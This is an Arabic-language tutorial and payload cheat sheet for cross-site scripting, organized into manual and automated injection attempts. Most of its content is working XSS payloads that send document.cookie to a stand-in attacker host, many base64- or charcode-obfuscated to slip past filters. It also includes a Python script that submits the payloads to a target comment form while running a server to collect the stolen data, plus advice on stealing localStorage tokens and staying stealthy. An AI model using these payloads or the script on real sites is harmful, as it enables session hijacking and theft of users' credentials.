
## الخطوات العملية لاستخدام الحقن المتقدمة
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة طلبات واستجابات HTTP.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات المرسلة من الحقن.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - تأكد من أن لديك حسابًا في التطبيق (إذا لزم الأمر) لإدخال البيانات في نقاط التخزين أو اختبار معلمات URL.

2. **تحديد نقاط الإدخال العرضة**:
   - ابحث عن نقاط إدخال تُرسل بيانات إلى الخادم أو تُخزنها، مثل:
     - معلمات URL (مثل `https://example.com/?q=test`) لـ XSS المنعكس.
     - حقول التعليقات، المنشورات، أو أوصاف الملف الشخصي لـ XSS المخزن.
     - حقول النماذج أو الرسائل التي تُعرض مباشرة أو تُخزن.
   - افحص استجابات الموقع (عبر Burp Suite أو عرض المصدر) لتحديد سياق العرض (HTML، سمات، JavaScript، CSS).
   - تحقق من سلوك الفلاتر عبر إدخال اختبارات بسيطة مثل `<b>test</b>` أو `'onerror=alert(1)` لفهم القيود.

3. **إدخال الحقن المتقدمة**:
   - أدخل شيفرة JavaScript متقدمة مصممة لتجاوز الفلاتر في نقطة الإدخال العرضة.
   - صمم الحقنة لتنفيذ شيفرة ضارة، مثل:
     - `<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>`
     - `<img src=x onerror=fetch('http://attacker.com/log?c='+btoa(document.cookie))>`
     - `<div tabindex=0 onfocus="fetch('http://attacker.com/log?c='+document.cookie)">`
   - جرب الحقن في سياقات مختلفة:
     - معلمة URL: `https://example.com/?q=<svg onload=alert('XSS')>`
     - حقل تعليق: أدخل `<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))>` في تعليق.
     - وصف الملف الشخصي: أدخل `<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4>Click</a>` في حقل الوصف.

4. **مراقبة الاستجابات**:
   - تحقق من تنفيذ الحقنة عبر زيارة الصفحة أو مراقبة الاستجابات:
     - **أدوات المطورين**: راقب وحدة التحكم (Console) للأخطاء أو التنبيهات، والشبكة (Network) للطلبات الصادرة.
     - **خادم خارجي**: تحقق من سجلات الخادم لتأكيد استلام البيانات (مثل ملفات تعريف الارتباط).
     - **تغييرات DOM**: تحقق من تعديل الصفحة أو إعادة التوجيه.
   - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه، إرسال بيانات إلى الخادم، أو إعادة توجيه).
   - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، CSP، أو تنظيف الإدخال.
   - سجل النتائج لتحديد الحقن الناجحة.

5. **تجربة أنواع حقن متقدمة مختلفة**:
   - إذا فشلت الحقنة، جرب أنواعًا أخرى:
     - استخدام وسوم غير شائعة: `<svg>`، `<object>`، `<video>`، أو `<details>`.
     - استهداف أحداث غير تقليدية: `onfocus`، `onblur`، `ontoggle`، أو `onanimationend`.
     - تجاوز الفلاتر: استخدم تعتيم (Base64، ASCII)، صيغ بديلة (مثل `JaVaScRiPt:`)، أو أحرف مشفرة.
   - اختبر نقاط إدخال متعددة (مثل معلمات URL أخرى، حقول تعليقات، أو أوصاف).
   - جرب حقنًا تستهدف سياقات مختلفة (مثل تعبيرات CSS، URIs مشفرة، أو JSON).

6. **تأكيد السياق وتصعيد الاستغلال (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<img src=x onerror=fetch('http://attacker.com/log?d='+btoa(document.domain))>`).
   - إذا نجحت الحقن، جرب هجمات متقدمة مثل:
     - سرقة بيانات حساسة (مثل `localStorage.getItem('token')`).
     - التلاعب بالصفحة (مثل إنشاء نموذج مزيف).
     - تنفيذ إجراءات المستخدم (مثل إرسال طلبات POST).
   - حافظ على التخفي بتجنب التنبيهات البصرية إذا كنت تستهدف سياقات حساسة.

---

## جميع المحاولات الممكنة لاستخدام الحقن المتقدمة
في استخدام الحقن المتقدمة، المحاولات تركز على تصميم شيفرات تتجاوز الفلاتر وتستغل سياقات معقدة. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال شيفرة في معلمات URL، حقول التعليقات، أو أوصاف الملف الشخصي. الهدف هو تنفيذ JavaScript بطرق تتجنب الكشف.

#### أ. حقن مع تعتيم (Obfuscation)  { #XSS_Obfuscation_payloads  }

استخدام تقنيات التعتيم لإخفاء الشيفرة.
- **الحقن**: `<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **الإدخال**: أدخل في حقل تعليق: `<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **كيف يعمل**: يفك تشفير Base64 لتنفيذ تنبيه.
  - **متى يُستخدم؟**: لتجاوز فلاتر WAF أو أنظمة الكشف.
- **الحقن**: `<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))>`
  - **الإدخال**: `https://example.com/?q=<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))>`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لسرقة البيانات مع تجاوز فلاتر `<script>`.
- **الحقن**: `<script>alert(String.fromCharCode(88,83,83))</script>`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `<script>alert(String.fromCharCode(88,83,83))</script>`
  - **كيف يعمل**: ينشئ تنبيهًا باستخدام رموز ASCII.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر النصوص المباشرة.
- **الحقن**: `<img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+btoa(document.cookie)), 1000)">`
  - **الإدخال**: أدخل في حقل تعليق: `<img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+btoa(document.cookie)), 1000)">`
  - **كيف يعمل**: يؤخر إرسال البيانات المشفرة بـ Base64 لتجنب الكشف.
  - **متى يُستخدم؟**: لتجنب أنظمة المراقبة الفورية.
- **الحقن**: `<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,108,111,103,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>`
  - **الإدخال**: أدخل في منشور: `<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109,47,108,111,103,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))</script>`
  - **كيف يعمل**: يشفر أمر `fetch` باستخدام ASCII لإرسال ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لتجاوز فلاتر صارمة.

#### ب. حقن بدون `<script>`
{  #XSS_Idea_for_script_tag }
استخدام وسوم أو أحداث بديلة لتجنب الحظر.
- **الحقن**: `<svg onload=alert('XSS')>`
  - **الإدخال**: `https://example.com/?q=<svg onload=alert('XSS')>`
  - **كيف يعمل**: ينفذ تنبيهًا عند تحميل وسم SVG.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<script>`.
- **الحقن**: `<img src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>`
  - **الإدخال**: أدخل في حقل تعليق: `<img src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لسرقة البيانات تلقائيًا.
- **الحقن**: `<details open ontoggle="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **الإدخال**: أدخل في منشور: `<details open ontoggle="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند تبديل حالة وسم `<details>`.
  - **متى يُستخدم؟**: لاستخدام أحداث غير شائعة.
- **الحقن**: `<video><source onerror=fetch('http://attacker.com/log?c='+document.cookie)></video>`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `<video><source onerror=fetch('http://attacker.com/log?c='+document.cookie)></video>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند فشل تحميل مصدر الفيديو.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<img>`.
- **الحقن**: `<div tabindex=0 onfocus="fetch('http://attacker.com/log?c='+document.cookie)">Click</div>`
  - **الإدخال**: أدخل في حقل تعليق: `<div tabindex=0 onfocus="fetch('http://attacker.com/log?c='+document.cookie)">Click</div>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند التركيز على العنصر.
  - **متى يُستخدم؟**: لاستهداف أحداث التفاعل.

#### ج. حقن باستخدام URIs مشفرة 
{ #ideas_for_url /  #XSS_ecoded_payload }
استخدام بروتوكولات مثل `javascript:` أو `data:`.
- **الحقن**: `<a href="javascript:alert('XSS')">Click</a>`
  - **الإدخال**: أدخل في منشور: `<a href="javascript:alert('XSS')">Click</a>`
  - **كيف يعمل**: ينفذ تنبيهًا عند النقر.
  - **متى يُستخدم؟**: لتأكيد الثغرة عند التفاعل.
- **الحقن**: `<a href="javascript:fetch('http://attacker.com/log?c='+btoa(document.cookie))">Click</a>`
  - **الإدخال**: أدخل في حقل تعليق: `<a href="javascript:fetch('http://attacker.com/log?c='+btoa(document.cookie))">Click</a>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط المشفرة عند النقر.
  - **متى يُستخدم؟**: لسرقة البيانات مع تعتيم.
- **الحقن**: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4">Click</a>`
  - **الإدخال**: `https://example.com/?q=<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4">Click</a>`
  - **كيف يعمل**: ينفذ تنبيهًا عند النقر باستخدام HTML مشفر.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `javascript:`.
- **الحقن**: `<img src="javascript:fetch('http://attacker.com/log?c='+document.cookie)">`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `<img src="javascript:fetch('http://attacker.com/log?c='+document.cookie)">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند تحميل الصورة (في متصفحات تدعم `javascript:` في `src`).
  - **متى يُستخدم؟**: لاستهداف متصفحات محددة.
- **الحقن**: `<iframe src="javascript:fetch('http://attacker.com/log?c='+document.cookie)">`
  - **الإدخال**: أدخل في حقل تعليق: `<iframe src="javascript:fetch('http://attacker.com/log?c='+document.cookie)">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند تحميل الإطار.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `<img>`.

#### د. حقن في سياقات JavaScript
{ #Inline_HTML_Injection / #XSS_ecoded_payload  }
استهداف متغيرات أو تعليمات JavaScript.
- **الحقن**: `";alert('XSS');//`
  - **الإدخال**: `https://example.com/?q=";alert('XSS');//`
  - **كيف يعمل**: ينفذ تنبيهًا إذا أُدرج في سياق JavaScript مثل `<script>var x="...";`.
  - **متى يُستخدم؟**: لاستهداف JavaScript.
- **الحقن**: `";fetch('http://attacker.com/log?c='+document.cookie);//`
  - **الإدخال**: أدخل في حقل تعليق: `";fetch('http://attacker.com/log?c='+document.cookie);//`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط في سياق JavaScript.
  - **متى يُستخدم؟**: لسرقة البيانات.
- **الحقن**: `"-fetch('http://attacker.com/log?c='+document.cookie)-"`
  - **الإدخال**: `https://example.com/?q="-fetch('http://attacker.com/log?c='+document.cookie)-"`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إذا أُدرج في تعبير JavaScript.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر الفواصل المنقوطة.
- **الحقن**: `eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))`
  - **الإدخال**: أدخل في منشور: `eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط في سياق JavaScript.
  - **متى يُستخدم؟**: لتجاوز فلاتر صارمة.
- **الحقن**: `Function('fetch("http://attacker.com/log?c="+document.cookie)')()`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `Function('fetch("http://attacker.com/log?c="+document.cookie)')()`
  - **كيف يعمل**: ينفذ أمر `fetch` باستخدام `Function` كنسخة ديناميكية من `eval`.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `eval`.

#### هـ. حقن في سياقات سمات أو CSS
{  #XSS--ALL--Event--Payload }
استهداف سمات HTML أو تعبيرات CSS.
- **الحقن**: `" onfocus="alert('XSS')`
  - **الإدخال**: `https://example.com/?q=" onfocus="alert('XSS')`
  - **كيف يعمل**: ينفذ تنبيهًا إذا أُدرج في سمة مثل `<input value="...">`.
  - **متى يُستخدم؟**: لاستهداف السمات.
- **الحقن**: `" onload="fetch('http://attacker.com/log?c='+document.cookie)`
  - **الإدخال**: أدخل في حقل تعليق: `" onload="fetch('http://attacker.com/log?c='+document.cookie)`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إذا أُدرج في سمة حدث.
  - **متى يُستخدم؟**: لاستهداف أحداث السمات.
- **الحقن**: `<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert('XSS')">`
  - **الإدخال**: أدخل في منشور: `<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert('XSS')">`
  - **كيف يعمل**: ينفذ تنبيهًا عند انتهاء الرسوم المتحركة.
  - **متى يُستخدم؟**: لاستخدام أحداث CSS غير شائعة.
- **الحقن**: `<input style="background-image:url(javascript:fetch('http://attacker.com/log?c='+document.cookie))">`
  - **الإدخال**: أدخل في وصف الملف الشخصي: `<input style="background-image:url(javascript:fetch('http://attacker.com/log?c='+document.cookie))">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر خاصية CSS (في متصفحات تدعم `javascript:` في CSS).
  - **متى يُستخدم؟**: لتجاوز فلاتر HTML.
- **الحقن**: `<div style="content:attr(data-x)" data-x="fetch('http://attacker.com/log?c='+document.cookie)" onmouseover="eval(this.dataset.x)">`
  - **الإدخال**: أدخل في حقل تعليق: `<div style="content:attr(data-x)" data-x="fetch('http://attacker.com/log?c='+document.cookie)" onmouseover="eval(this.dataset.x)">`
  - **كيف يعمل**: ينفذ شيفرة عند تمرير المؤشر باستخدام سمة مخصصة.
  - **متى يُستخدم؟**: لاستخدام سمات مخصصة.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests` أو `selenium`) لأتمتة اختبار مجموعة من الحقن المتقدمة وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن المتقدمة التي تستهدف سياقات متنوعة.
  - مثال قائمة:
    ```
    <svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>
    <img src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>
    <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4">Click</a>
    ";fetch('http://attacker.com/log?c='+document.cookie);//
    <details open ontoggle="fetch('http://attacker.com/log?c='+document.cookie)">
    ```
- **كيف يعمل**:
  - يتم إرسال الحقن عبر نقاط إدخال (مثل معلمات URL أو حقول تعليقات).
  - يتم مراقبة الخادم الخارجي أو المتصفح لتأكيد التنفيذ.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع خادم لتسجيل البيانات):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse
  import requests

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          post_data = self.rfile.read(content_length).decode()
          print(f"بيانات POST مستلمة: {post_data}")

  payloads = [
      "<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
      "<img src=x onerror=fetch('http://localhost:8000/log?c='+document.cookie)>",
      "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4\">Click</a>",
      "\";fetch('http://localhost:8000/log?c='+document.cookie);//",
      "<details open ontoggle=\"fetch('http://localhost:8000/log?c='+document.cookie)\">"
  ]

  target_url = "https://example.com/submit-comment"
  for payload in payloads:
      try:
          response = requests.post(target_url, data={"comment": payload})
          print(f"تم إرسال: {payload}")
      except:
          print(f"فشل إرسال: {payload}")
  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يُرسل الحقن إلى نقطة إدخال (مثل حقل تعليق) عبر طلب POST.
  - يسجل البيانات المستلمة في الخادم.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لنقاط إدخال متعددة.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **طلبات الشبكة**: تحقق من الطلبات المرسلة إلى `http://attacker.com/log`.
    - **وحدة التحكم**: تحقق من ظهور تنبيهات أو أخطاء في Console.
    - **تغييرات DOM**: تحقق من إعادة التوجيه أو تعديل الصفحة.
  - مثال: إذا تلقى الخادم `c=sessionid=abc123`، فهذا يؤكد نجاح الحقن.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد النقاط القابلة للاستغلال.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<marquee onstart="fetch('http://attacker.com/log?c='+document.cookie)">` أو `<object data="javascript:alert('XSS')">`).
  - جرب أحداث أخرى (مثل `onresize`، `onscroll`) أو وسوم أخرى (مثل `<embed>`، `<math>`).
  - اختبر سياقات معقدة (مثل تعبيرات RegExp أو حقن في JSON).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<input type=image src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---


